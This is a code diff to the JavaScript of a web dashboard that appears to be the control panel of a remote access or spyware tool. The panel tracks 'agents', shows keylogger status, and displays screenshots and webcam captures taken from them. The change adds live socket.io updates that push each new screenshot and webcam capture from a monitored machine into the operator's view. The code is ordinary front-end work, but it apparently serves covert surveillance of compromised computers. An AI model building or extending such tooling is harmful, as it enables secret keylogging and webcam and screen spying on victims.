@@ -672,6 +672,15 @@ document.addEventListener('DOMContentLoaded', function() {
                     newDoc.getElementById('screenshots-section').innerHTML;
             }
             
+            // Update webcam captures
+            const newWebcamCaptures = newDoc.getElementById('webcam-container');
+            if (newWebcamCaptures) {
+                document.getElementById('webcam-container').innerHTML = newWebcamCaptures.innerHTML;
+            } else {
+                document.getElementById('webcam-section').innerHTML = 
+                    newDoc.getElementById('webcam-section').innerHTML;
+            }
+            
             // Reinitialize lightbox
             if (typeof lightbox !== 'undefined') {
                 lightbox.init();
@@ -799,6 +808,122 @@ document.addEventListener('DOMContentLoaded', function() {
         statusBadge.textContent = 'Keylogger Status: Inactive';
         statusBadge.className = 'badge bg-danger';
     });
+
+    // Connect to main socket namespace for screenshot and webcam updates
+    const mainSocket = io("{{ request.url_root }}", { reconnection: true });
+
+    mainSocket.on('connect', () => {
+        console.log('Connected to main websocket namespace');
+    });
+
+    // Handle new screenshot events - add new screenshot to the top of the list
+    mainSocket.on('new_screenshot', (data) => {
+        console.log('Received new_screenshot event:', data);
+        if (data.agent_id === '{{ agent.id }}') {
+            const screenshotsContainer = document.getElementById('screenshots-container');
+            const screenshotsSection = document.getElementById('screenshots-section');
+            
+            if (screenshotsContainer) {
+                // Remove "No screenshots available" message if present
+                const noScreenshotMsg = screenshotsSection.querySelector('.text-muted');
+                if (noScreenshotMsg && noScreenshotMsg.textContent.includes('No screenshots')) {
+                    noScreenshotMsg.remove();
+                }
+                
+                // Create new screenshot element
+                const newScreenshotHtml = `
+                    <div class="col-md-6 mb-3">
+                        <a href="{{ base_url }}/api/screenshots/${data.screenshot_id}" data-lightbox="screenshots-{{ agent.id }}">
+                            <img src="{{ base_url }}/api/screenshots/${data.screenshot_id}" class="img-fluid rounded" alt="Screenshot">
+                        </a>
+                        <p class="small text-muted mt-1">${data.timestamp}</p>
+                    </div>
+                `;
+                
+                // Insert at the beginning
+                screenshotsContainer.insertAdjacentHTML('afterbegin', newScreenshotHtml);
+                
+                // Reinitialize lightbox for new image
+                if (typeof lightbox !== 'undefined') {
+                    lightbox.init();
+                }
+                
+                // Show notification
+                showNotification('New screenshot received', 'info');
+            }
+        }
+    });
+
+    // Handle new webcam capture events - add new capture to the top of the list
+    mainSocket.on('new_webcam', (data) => {
+        console.log('Received new_webcam event:', data);
+        const currentAgentId = '{{ agent.id }}';
+        console.log('Current agent ID:', currentAgentId, 'Event agent_id:', data.agent_id);
+        
+        // Check if the event is for this agent (compare both string and number)
+        if (String(data.agent_id) === String(currentAgentId) || data.agent_id === currentAgentId) {
+            console.log('Processing webcam capture for this agent');
+            const webcamContainer = document.getElementById('webcam-container');
+            const webcamSection = document.getElementById('webcam-section');
+            
+            if (webcamContainer) {
+                // Remove "No webcam captures available" message if present
+                const noWebcamMsg = webcamSection.querySelector('.text-muted');
+                if (noWebcamMsg && noWebcamMsg.textContent.includes('No webcam')) {
+                    noWebcamMsg.remove();
+                }
+                
+                // Create new webcam capture element
+                const newWebcamHtml = `
+                    <div class="col-md-6 mb-3">
+                        <a href="{{ base_url }}/api/webcam_captures/${data.capture_id}" data-lightbox="webcam-{{ agent.id }}">
+                            <img src="{{ base_url }}/api/webcam_captures/${data.capture_id}" class="img-fluid rounded" alt="Webcam Capture">
+                        </a>
+                        <p class="small text-muted mt-1">${data.timestamp}</p>
+                    </div>
+                `;
+                
+                // Insert at the beginning
+                webcamContainer.insertAdjacentHTML('afterbegin', newWebcamHtml);
+                
+                // Reinitialize lightbox for new image
+                if (typeof lightbox !== 'undefined') {
+                    lightbox.init();
+                }
+                
+                // Show notification
+                showNotification('New webcam capture received', 'info');
+                
+                console.log('Webcam capture added to UI successfully');
+            } else {
+                console.log('Webcam container not found, triggering page refresh');
+                // If container not found, refresh the page
+                refreshAgentDetail();
+            }
+        } else {
+            console.log('Webcam event is for a different agent:', data.agent_id, 'vs current:', currentAgentId);
+        }
+    });
+
+    // Also handle webcam events from the task_complete event
+    mainSocket.on('task_complete', (data) => {
+        console.log('Received task_complete event:', data);
+        if (data.task_type === 'webcam' && String(data.agent_id) === String('{{ agent.id }}')) {
+            console.log('Webcam task completed, refreshing to show new capture');
+            refreshAgentDetail();
+        }
+    });
+
+    // Helper function to show notifications
+    function showNotification(message, type) {
+        const alert = document.createElement('div');
+        alert.className = `alert alert-${type} fixed-top mx-auto mt-3`;
+        alert.style.width = '300px';
+        alert.style.zIndex = '1000';
+        alert.textContent = message;
+        document.body.appendChild(alert);
+        setTimeout(() => alert.remove(), 3000);
+    }
 
 });
 </script>
